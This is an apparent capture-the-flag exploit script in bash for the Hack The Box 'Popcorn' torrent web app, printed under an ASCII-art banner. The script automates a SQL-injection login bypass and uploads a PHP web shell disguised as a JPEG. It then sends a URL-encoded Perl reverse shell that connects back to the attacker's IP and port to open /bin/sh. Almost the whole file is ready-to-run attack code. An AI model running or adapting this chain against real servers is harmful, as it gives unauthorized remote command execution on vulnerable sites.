echo "QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQCAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAgIC8gICAgICAsICBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEAgICAgQEBAQCAgICBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAIEBAQEAvQEBAKCAgICBAQEBAQEAgICAgLEBAQChAQEAvIEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAICAgICBAQCAgICAg
ICwsIEBAICAoICAgICAgQEAgICAgIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAICBAQEBAICAqQCAgICAgICAgICAgICBAQCAgIEBAQEAgQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAICBAQEBAQEAgICBAQEBAQEBAQEBA
QEAgIC5AQEBAQEAgIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAICBAQEBAQCAgICAgICAgIEBAICAgICAgICBAQEBAQCAgQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgQC4gICAgICAgICAgQCAgICAgICAgICAgICBA
QCAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgICAg
ICAgICAuJUAsICAgICAgICAgICAgICAgICAqQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQCAgICBAQEBAQEBAQEBAKiAgICAgICAgICAgICAgICAgQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgICBAQEBAQEBAQEBA
ICAgICAgIChAQCAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQCAgICAgQEBAQEBAQEAgICAgICAgICAgICAgICAgICAgQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCUgICAgLEAuICAgICAgICAgICAgICAg
ICAgICAgICBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAICBAICAgICAgICAgICAgICAgICAgICAgICAgIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAK
QEBAQEBAQEBAQEBAQEBAQEBAQCgqQEBAQEBAJUAgICAgICAgICAgICYgICAgICAgICAgICAsQEBA
QEBAJiBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
ICAgICAgICAgICAgICAgIEBAQEBAQEBAQCBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAKiAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAICAgICAgICBAQEBAQEBAQEBA
QEBAQEBAQCAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAICAgQCggIEBAIEBALEBAQEAgQEAgICAsICAgIEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAjQC4gQEAgQEAgQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAKCxAQCBAICBAQCBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgQEAgQEBAQEBAJkBAIEBAIC5AQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAKCAgICAgQEBAQEBA
QEBAQEBAQEBAQEBAQEAgJSAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEAgL0BAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAKCAgKEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAK" | base64 -d

sleep 1
if [[ $# -eq 0 ]]; then
	echo "*** Prep for AWAE PopCornBox on HTB ***"
	echo "USAGE ./exploit TARGET IP/HOSTNAME ATTACKER_IP  ATTACKER_PORT"
	echo "Example ./exploit 10.10.10.6 10.10.14.51 4444"
	exit 0;
fi

HOSTNAME=$1
LOCALHOST=$2
PORT=$3
echo "TARGET => $HOSTNAME"
echo "ATTACKER => $LOCALHOST"
echo "ATTACKER PORT => $PORT"

curl -i -s -k -X $'POST' \
    -H "Host: $HOSTNAME" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.10.6/torrent/login.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 44' -H $'Connection: close' -H $'Cookie: /torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'/torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' \
    --data-binary $'username=%27+or+1%3D1+--+-&password=password' \
    "http://$HOSTNAME/torrent/login.php" -c cookiefile.txt 

echo "Logged In"
echo "Attempting Upload"
echo "Wait atleast 60 seconds....Dont exit..."
curl -i -s -k -X $'POST' \
    -H "Host: $HOSTNAME" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.10.6/torrent/torrents.php?mode=upload' -H $'Content-Type: multipart/form-data; boundary=---------------------------159549791614934376731002978675' -H $'Content-Length: 1758' -H $'Connection: close' -H $'Cookie: /torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'/torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' \
    --data-binary $'-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"torrent\"; filename=\"gotim.torrent\"\x0d\x0aContent-Type: application/x-bittorrent\x0d\x0a\x0d\x0ad8:announce40:http://tracker.example.com:6969/announce10:created by26:Enhanced-CTorrent/dnh3.3.213:creation datei1597162173e4:infod6:lengthi7e4:name9:gotim.txt12:piece lengthi262144e6:pieces20:\xe4O\xeefi33\xf1\xf64\xde\x02\xfc\xc2*[\x17\xc0\xe4\xc4ee\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"filename\"\x0d\x0a\x0d\x0agotim\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"type\"\x0d\x0a\x0d\x0a3\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"subtype\"\x0d\x0a\x0d\x0a24\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"user_id\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"anonymous2\"\x0d\x0a\x0d\x0afalse\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"anonymous\"\x0d\x0a\x0d\x0atrue\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"autoset\"\x0d\x0a\x0d\x0aenabled\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"info\"\x0d\x0a\x0d\x0agotim\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"registration\"\x0d\x0a\x0d\x0afalse\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"hideuser\"\x0d\x0a\x0d\x0afalse\x0d\x0a-----------------------------159549791614934376731002978675\x0d\x0aContent-Disposition: form-data; name=\"submit\"\x0d\x0a\x0d\x0aUpload Torrent\x0d\x0a-----------------------------159549791614934376731002978675--\x0d\x0a' \
    "http://$HOSTNAME/torrent/torrents.php?mode=upload" -b cookiefile.txt

echo "Uploaded..."
echo "Attempting php shell upload..."

curl -i -s -k -X $'POST' \
	    -H "Host: $HOSTNAME" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.10.6/torrent/edit.php?mode=edit&id=9ecbfdf737041982e5fdcc07407056da81a220b0' -H $'Content-Type: multipart/form-data; boundary=---------------------------19549457741222511857475620064' -H $'Content-Length: 14435' -H $'Connection: close' -H $'Cookie: /torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' -H $'Upgrade-Insecure-Requests: 1' \
	        -b $'/torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' \
		    --data-binary $'-----------------------------19549457741222511857475620064\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"cmd.jpg.php\"\x0d\x0aContent-Type: image/jpeg\x0d\x0a\x0d\x0a/9j/2wCEAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDIBCQkJDAsMGA0NGDIhHCEyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMv/AABEIAZABkAMBIgACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+gEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubo=<?php echo system($_REQUEST[\'latortuga\']);?>\x0d\x0a\x0d\x0a-----------------------------19549457741222511857475620064\x0d\x0aContent-Disposition: form-data; name=\"submit\"\x0d\x0a\x0d\x0aSubmit Screenshot\x0d\x0a-----------------------------19549457741222511857475620064--\x0d\x0a' \
		        "http://$HOSTNAME/torrent/upload_file.php?mode=upload&id=9ecbfdf737041982e5fdcc07407056da81a220b0" -b cookiefile.txt &
sleep 10
echo "DONE MAYBE?"
echo "Start a netcat listener on port $PORT you have 10 seconds"
sleep 10
kill %1
sleep 5
curl -i -s -k -X $'GET' \
    -H "Host: $HOSTNAME" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: /torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
    -b $'/torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=5; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=287a46dc4e7ed7f56fe2cf5fb02c691c' \
    "http://$HOSTNAME/torrent/upload/9ecbfdf737041982e5fdcc07407056da81a220b0.php?latortuga=%70%65%72%6c%20%2d%65%20%27%75%73%65%20%53%6f%63%6b%65%74%3b%24%69%3d%22$LOCALHOST%22%3b%24%70%3d$PORT%3b%73%6f%63%6b%65%74%28%53%2c%50%46%5f%49%4e%45%54%2c%53%4f%43%4b%5f%53%54%52%45%41%4d%2c%67%65%74%70%72%6f%74%6f%62%79%6e%61%6d%65%28%22%74%63%70%22%29%29%3b%69%66%28%63%6f%6e%6e%65%63%74%28%53%2c%73%6f%63%6b%61%64%64%72%5f%69%6e%28%24%70%2c%69%6e%65%74%5f%61%74%6f%6e%28%24%69%29%29%29%29%7b%6f%70%65%6e%28%53%54%44%49%4e%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%4f%55%54%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%45%52%52%2c%22%3e%26%53%22%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%22%29%3b%7d%3b%27" &
sleep 5
kill %1
echo "Check your shell!"
exit 0;
